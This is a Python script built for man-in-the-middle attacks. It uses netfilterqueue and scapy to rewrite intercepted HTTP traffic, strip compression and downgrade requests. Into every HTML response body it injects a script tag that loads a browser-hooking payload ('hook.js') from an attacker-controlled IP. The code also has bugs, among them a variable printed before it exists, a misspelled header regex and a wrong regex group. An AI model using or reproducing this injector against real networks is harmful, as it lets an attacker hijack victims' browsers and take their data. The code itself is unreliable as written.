import netfilterqueue
import scapy.all as scapy
import re

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP()].dport == 10000:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
            print(new_packet.show())

        elif scapy_packet[scapy.TCP()].sport == 10000:
            print("[+] Response")
            #print(scapy_packet.show())
            injection_code = '<script src = "http://10.20.14.213:3000/hook.js"></script>'
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:conetent-Length:\s)(\d*)", load)

            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(0)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("[+] CNTRL C has been detected; exiting program now.")